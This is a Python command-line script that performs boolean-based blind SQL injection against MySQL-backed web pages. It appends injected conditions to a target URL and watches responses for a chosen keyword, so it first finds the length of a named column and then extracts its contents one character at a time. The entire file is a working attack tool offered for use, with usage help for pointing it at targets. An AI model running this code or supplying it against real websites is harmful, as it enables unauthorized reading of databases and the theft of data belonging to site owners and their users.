import os
import requests
import argparse
from treelib import Node, Tree
from string import ascii_lowercase
from string import digits
from string import punctuation
from colorama import Fore, init
import colorama
colorama.init()

class Mysql:
	def __init__(self, url, column_name, length, sign, clear):
		self.url = url
		self.column_name = column_name
		self.length = length
		self.sign = sign
		self.clear = clear

	def clear_term(self):
		os.system(f"{self.clear}")

	def info(self):
		tree = Tree()
		tree.create_node(f"{Fore.YELLOW}Target" + f"{Fore.RESET}", "target")
		tree.create_node(f"{Fore.YELLOW}Url" + f"{Fore.RESET}", "url", parent="target")
		tree.create_node(f"{Fore.GREEN}{self.url}" + f"{Fore.RESET}", parent="url")
		tree.create_node(f"{Fore.YELLOW}Column" + f"{Fore.RESET}", "column", parent="target")
		tree.create_node(f"{Fore.GREEN}{self.column_name}" + f"{Fore.RESET}", parent="column")
		tree.create_node(f"{Fore.YELLOW}Sign" + f"{Fore.RESET}", "sign", parent="target")
		tree.create_node(f"{Fore.GREEN}{self.sign}" + f"{Fore.RESET}", parent="sign")
		tree.show()

	def length_row(self):
		print(f"{Fore.WHITE}[{Fore.YELLOW}Length{Fore.WHITE}]: ", end='', flush=True)
		for i in range(0, 100):
			target = requests.get(self.url + f" and (select length({self.column_name})=" + str(i) + ")#")
			if self.sign in target.text:
				print(f"{Fore.GREEN}{i}")
				break

	def substr_row(self):
		charset = [str(i) for i in ascii_lowercase + digits + punctuation]
		print(f"{Fore.WHITE}[{Fore.YELLOW}Substring{Fore.WHITE}]: ", end='', flush=True)
		for a in range(0, int(self.length)):
			for b in charset:
				target = requests.get(self.url + f" and (select substr({self.column_name}, " + str(a) + ", 1)=0x" + str(b).encode("utf8").hex() +  ")#")
				if self.sign in target.text:
					print(f"{Fore.GREEN}{b}", end='', flush=True)

if __name__ == "__main__":
	clear = Mysql(False, False, False, False, "cls" if os.name == "nt" else "clear")
	clear.clear_term()
	parser = argparse.ArgumentParser()
	parser.add_argument('-lr', '--length_row', dest='length_row', action='store_true', help='usage: python3 main.py -lr --url [https://example.com/a.php?id=1] --column [name] --sign [keyword]')
	parser.add_argument('-sr', '--substr_row', dest='substr_row', action='store_true', help='usage: python3 main.py -sr --url [https://example.com/a.php?id=1] --column [name] --sign [keyword]')
	parser.add_argument('-url', '--url', dest='url')
	parser.add_argument('-column', '--column', dest='column')
	parser.add_argument('-length', '--length', dest='length')
	parser.add_argument('-sign', '--sign', dest='sign')
	args = parser.parse_args()

	if args.length_row:
		length_row = Mysql(args.url, args.column, False, args.sign, False)
		info = Mysql(args.url, args.column, False, args.sign, False)
		info.info()
		length_row.length_row()

	if args.substr_row:
		substr_row = Mysql(args.url, args.column, args.length, args.sign, False)
		info = Mysql(args.url, args.column, False, args.sign, False)
		info.info()
		substr_row.substr_row()
